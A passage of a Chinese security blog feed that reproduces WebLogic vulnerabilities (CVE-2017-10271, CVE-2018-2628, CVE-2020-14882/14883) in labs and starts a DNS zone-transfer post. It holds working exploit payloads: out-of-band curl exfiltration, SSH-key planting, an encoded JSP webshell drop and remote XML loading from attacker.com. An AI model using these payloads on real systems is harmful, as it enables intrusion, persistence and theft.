alt=""></p><p>最后访问即可<code>/bea_wls_internal/test.jsp</code>：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/5.png" alt=""></p><h4 id="写SSH-Key"><a href="#写SSH-Key" class="headerlink" title="写SSH Key"></a>写SSH Key</h4><p>修改前面HTTP OOB外带查询当前用户的名称：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>curl http://x.x.x.x:6666/x -d "x=`whoami`"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后探测是否存在.ssh目录和authorized_keys文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=`ls -l /home/xxx/.ssh`</span><br></pre></td></tr></table></figure><p>如果不存在则需要先创建，之后进行写SSH Key，使用追加的方式，不覆盖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgsrQRaSsoX1tEv0+xqWFaWrFt5RA+ZnaevW9Fh2y8RACQ1h++EpFyD0HqsQD5Gfz6bEzis9KbZaytyketcPOe7XB2Qd0r+kSPu7k1iycTj0A59/mbMwDH42WJd27aeTmyJCAyQl8E6zIVaTZw137I4jVcyOruSFHxjeOvH5gaut2s6AZyCxJx5DpVHt6Sbj2FHPVDtOZ/Dxv1cyhCaybBfX0U88T8xrIwX5KIMmd2cj2lJsVHXxHk255lBgGL1n1oWXgllOIDfg3HJFxzualjf+NzKmhg8B+4GSfGSY8KEK/pCeiaDIYcB2tVk3sUDUw5gEUEpGJWxQlAGClEQ29DvBjRT/6hESz4nYUKlOI4CfdCwlX6NDM8JHttZqdORrzXoOMeu1Nc4IBO4jNMfzBHecbWkPb+W2kyouwfe2yAToA10G6IdllUq9HzTlcqLe+XW11i8P0FVvbv7GKeEfnFxd/NY51H7E15P7O65DIxvjBQeKlnMOLTOy2+xPfIIRs=" &gt;&gt; /home/xxx/.ssh/authorized_keys<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看是否成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=`cat /home/xxx/.ssh/authorized_keys`</span><br></pre></td></tr></table></figure><p>写入成功后就能直接SSH登录了：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/6.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：</p><p><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">https://paper.seebug.org/487/</a></p><p><a href="https://bl4ck.in/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://bl4ck.in/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级WebLogic版本；</li><li>删除WLS-WebServices组件；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic T3反序列化漏洞（CVE-2018-2628）</title>
    <link href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/</id>
    <published>2021-04-05T10:32:07.000Z</published>
    <updated>2021-04-05T14:17:01.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic T3反序列化漏洞（CVE-2018-2628）。</p><h2 id="0x01-WebLogic-T3反序列化漏洞（CVE-2018-2628）"><a href="#0x01-WebLogic-T3反序列化漏洞（CVE-2018-2628）" class="headerlink" title="0x01 WebLogic T3反序列化漏洞（CVE-2018-2628）"></a>0x01 WebLogic T3反序列化漏洞（CVE-2018-2628）</h2><p>这是xxlegend大佬挖的一个漏洞。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2628/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2018-2628/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单地说，就是WebLogic开启了T3协议服务，攻击者可以通过T3协议来进行RMI反序列化漏洞的攻击利用从而RCE。</p><h3 id="使用Nmap脚本探测T3服务"><a href="#使用Nmap脚本探测T3服务" class="headerlink" title="使用Nmap脚本探测T3服务"></a>使用Nmap脚本探测T3服务</h3><p>Nmap的weblogic-t3-info脚本可以探测WebLogic的T3服务是否开启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -v -p7001,7002 172.19.0.1 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p>这里探测目标环境7001端口是开启了T3服务的：</p><p><img src="/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/2.png" alt=""></p><p>这里返回目标WebLogic的具体版本号为10.3.6.0以及开启了T3服务等信息，是存在T3反序列化漏洞的，接着进行漏洞复现。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先在攻击者服务器通过ysoserial来启动一个JRMP服务端，这里使用CommonsCollections1这条Gadget进行反序列化利用，其中通过DNSLog外带验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 <span class="string">"ping t3.f1gexy.dnslog.cn"</span></span><br></pre></td></tr></table></figure><p>然后，使用这个<a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">exploit脚本</a>向目标WebLogic服务器发送报文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br></pre></td></tr></table></figure><blockquote><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是<code>JRMPClient</code>或<code>JRMPClient2</code>。</p></blockquote><p>最后，看到DNSLog记录：</p><p><img src="/2021/04/05/浅析WebLogic-T3反序列化漏洞（CVE-2018-2628）/1.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：<a href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级WebLogic版本；</li><li>关闭T3服务，或控制T3服务的访问权限；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic未授权RCE（CVE-2020-14882/CVE-2020-14883）</title>
    <link href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic%E6%9C%AA%E6%8E%88%E6%9D%83RCE%EF%BC%88CVE-2020-14882-CVE-2020-14883%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/</id>
    <published>2021-04-05T09:03:08.000Z</published>
    <updated>2021-04-14T01:59:28.427Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic未授权RCE（CVE-2020-14882/CVE-2020-14883）漏洞。</p><h2 id="0x01-WebLogic未授权RCE"><a href="#0x01-WebLogic未授权RCE" class="headerlink" title="0x01 WebLogic未授权RCE"></a>0x01 WebLogic未授权RCE</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2020-14882/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2020-14882/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul><li>CVE-2020-14883：允许未授权的用户通过目录穿越结合双重URL编码的方式来绕过管理控制台的权限验证访问后台。</li><li>CVE-2020-14882：允许后台任意用户通过HTTP协议执行任意命令。</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主要是以下两个CVE的组合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现RCE。</p><h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p>正常情况下，没有登录WebLogic的话访问console后台就会直接302跳转到<code>/console/login/LoginForm.jsp</code>登录界面。</p><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/2.png" alt=""></p><p>但是，通过目录穿越结合双重URL编码就能绕过认证实现未授权访问console后台：</p><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/3.png" alt=""></p><p>这里未授权访问的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=</span><br></pre></td></tr></table></figure><h4 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h4><p>前面的CVE虽然可以访问后台，但是是低权限用户、无法安装应用，因此这里可以通过访问如下URL触发命令执行，这里用DNSLog实现外带验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/console.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&apos;curl%20http://weblogic.rlk5z3.dnslog.cn&apos;);&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/1.png" alt=""></p><p>看到本次利用的恶意类为<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>。</p><h4 id="组合利用"><a href="#组合利用" class="headerlink" title="组合利用"></a>组合利用</h4><p>将前面两个CVE组合起来利用就能实现未授权RCE的效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&apos;curl%20http://weblogic.2qokvr.dnslog.cn&apos;);&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/4.png" alt=""></p><h4 id="绕xx姿势"><a href="#绕xx姿势" class="headerlink" title="绕xx姿势"></a>绕xx姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /biz/%2e./console/css/%25%32e%25%32e%25%32fconsole.portal HTTP/1.1</span><br><span class="line">Host: a.com</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: BIGipServerSOL3_Docker_ZB=!ZhZtHJOmr5bPDjl6JVsajan6U8tjmcsXu/RgQvH6FyBrNzbalB857UZ0cOVZRMDvApu0sGpXvBnISqc=; TS01a69607=011223a830f54e1940dbb38950c7e6a279c477815452ea36745aed14040c887138bcb023eb2c41d4ba3cd0ba478b0228afcb3ead628ca92eac2dea5d867b15ba9443d0d8de;</span><br><span class="line">Content-Length: 2044</span><br><span class="line">X-Forwarded-For: 223.104.96.232</span><br><span class="line">Client_IP_ADDR: 223.104.96.232</span><br><span class="line"></span><br><span class="line">_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;handle=com.tangosol.coherence.mvel.sh.ShellSession(%25%327Runtim%25%365.g%25%365tRuntim%25%365().%25%365x%25%365c(n%25%365w String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;find $DOMAIN_HOME -typ%25%365 d -nam%25%365 b%25%365a_wls_int%25%365rnal|whil%25%365 r%25%365ad f;do find $f -typ%25%365 f -nam%25%365 ind%25%365x.html;don%25%365|whil%25%365 r%25%365ad ff;do %25%365cho -n PCVAIHBhZ2UgY29udGVudFR5cGU9InRl%25%365HQvaHRtbDsgY2hhcnNldD1VVEYtOCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU%25%32BCgo8JQpTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOwpTdHJpbmcgb3V0cHV0ID0gIiI7CmlmIChjbWQgIT1udWxsICYmIGNtZCAhPSAiIikKICAgIHsKICAgICAgICBTdHJpbmdbXSBjb21tYW5kID0gU3lzdGVtLmdldFByb3BlcnR5KCJvcy5uYW1lIikudG9Mb3dlckNhc2UoKS5pbmRl%25%365E9mKCJ3aW5kb3dzIik%25%32BLTEgPyBuZXcgU3RyaW5nW10g%25%365yJjbWQuZXhlIiwgIi9jIiwgY21kfSA6IG5ldyBTdHJpbmdbXSB7Ii9iaW4vc2giLCAiLWMiLCBjbWR9OwoKICAgICAgICBTdHJpbmcgcyA9IG51bGw7CiAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY29tbWFuZCk7CiAgICAgICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBzSSA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CiAgICAgICAgICAgICAgICB3aGlsZSAoKHMgPSBzSS5yZWFkTGluZSgpKSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ICs9IHMgKyJcclxuIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBzSTEgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKHAuZ2V0RXJyb3JTdHJlYW0oKSkpOwogICAgICAgICAgICAgICAgd2hpbGUgKChzID0gc0kxLnJlYWRMaW5lKCkpICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAg%25%365wogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgKz0gcyArIlxyXG4iOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIGNhdGNoIChJT0V4Y2VwdGlvbiBlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CgogICAgfQogICAgZWxzZSBvdXRwdXQ9ImNtZCBzaGVsbCI7CiU%25%32BCjxwcmU%25%32BIDxjb2RlPjwlPW91dHB1dCU%25%32BIDwvY29kZT48L3ByZT4=|bas%25%36564 -d &gt;$(dirnam%25%365 $ff)/.xzs%25%365c.jsp;don%25%365&quot;&#125;);%25%327)</span><br></pre></td></tr></table></figure><h4 id="通杀的恶意类"><a href="#通杀的恶意类" class="headerlink" title="通杀的恶意类"></a>通杀的恶意类</h4><p>由前面知道，利用进行命令执行的恶意类是<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，其只能在Weblogic 12.2.1以上版本才能利用，这是因为10.3.6版本中并不存在该恶意类。</p><p>那就换个CVE-2019-2725中提到的更为通用的恶意类<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，其对所有版本的WebLogic均有效。</p><p>FileSystemXmlApplicationContext类原理：该类会远程加载目标服务器上的XML文件并进行解析，其中可以指定解析的Bean为ProcessBuilder类及其start()函数、构造函数参数为恶意命令，进而实现RCE。</p><p>首先，需要将恶意XML文件放置在攻击者服务器上，前提是WebLogic服务器能访问得到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[curl http://weblogic.pqczq8.dnslog.cn]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着，同前面的方法，让WebLogic服务器去加载该恶意XML文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://attacker.com/rce.xml&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/6.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>待分析…</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>参考：<a href="https://github.com/GGyao/CVE-2020-14882_ALL" target="_blank" rel="noopener">https://github.com/GGyao/CVE-2020-14882_ALL</a></p><p><img src="/2021/04/05/浅析WebLogic未授权RCE（CVE-2020-14882-CVE-2020-14883）/5.png" alt=""></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析DNS域传送漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/04/03/浅析DNS域传送漏洞/</id>
    <published>2021-04-03T14:15:23.000Z</published>
    <updated>2021-04-03T17:48:04.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>环境参考：<a href="https://vulhub.org/#/environments/dns/dns-zone-transfer/" target="_blank" rel="noopener">https://vulhub.org/#/environments/dns/dns-zone-transfer/</a></p><h2 id="0x01-DNS域传送漏洞"><a href="#0x01-DNS域传送漏洞" class="headerlink" title="0x01 DNS域传送漏洞"></a>0x01 DNS域传送漏洞</h2><h3 id="DNS域传送"><a href="#DNS域传送" class="headerlink" title="DNS域传送"></a>DNS域传送</h3><p>DNS主备服务器会通过DNS域传送来进行数据库的同步。域传送是指后备服务器从主服务器复制数据，并用得到的数据更新自身数据库。</p><h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞，也就是说，攻击者可以利用这个漏洞来获取该DNS中记录的敏感信息。</p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><h4 id="通过dig检测"><a href="#通过dig检测" class="headerlink" title="通过dig检测"></a>通过dig检测</h4><p>在Linux下，可以使用dig命令来发送DNS请求。</p><p>发送axfr类型的DNS请求，注意要查询的域名前面无需带子域名如www：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @目标DNS服务器ip axfr 查询的域名</span><br></pre></td></tr></table></figure><p>其中@指定DNS服务器；axfr（Authoritative Transfer的缩写）是q-type类型的一种、指请求传送某个区域的全部记录。</p><p>发送一个axfr请求来欺骗DNS服务器，如果该DNS服务器上存在该漏洞，就会返回所有的解析记录值。</p><p>看下Vulhub的环境吧。</p><p>运行了漏洞靶机后，docker容器的53端口和宿主机是绑定的，也就是说这个存在域传送漏洞的DNS服务器写宿主机的IP即可。</p><p>正常来说，dig解析vulhub.org域名结果如下，其中指定8.8.8.8的DNS服务器是不存在域传送漏洞的：</p><p><img src="/2021/04/03/浅析DNS域传送漏洞/1.png" alt=""></p><p>然后，指定为存在域传送漏洞的DNS服务器进行再次查询，看到是完全返回该漏洞DNS服务器中保存的目标域的所有敏感信息，包括所有子域、A记录、CNAME等等：</p><p><img src="/2021/04/03/浅析DNS域传送漏洞/2.png" alt=""></p><h4 id="通过nslookup检测"><a href="#通过nslookup检测" class="headerlink" title="通过nslookup检测"></a>通过nslookup检测</h4><p>在Windows下的nslookup命令可以先指定目标DNS服务器地址、再使用ls命令来检测是否存在DNS域传送漏洞。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt;nslookup</span><br><span class="line">&gt;server 目标DNS服务器地址</span><br><span class="line">&gt;ls 目标域名</span><br></pre></td></tr></table></figure><p>如果不存在DNS域传送漏洞则输出如下：</p><p><img src="/2021/04/03/浅析DNS域传送漏洞/4.png" alt=""></p><p>在Linux中可以进行如下操作来检测。</p><p>默认查询域名的子域名信息，返回未授权的回应：</p><p><img 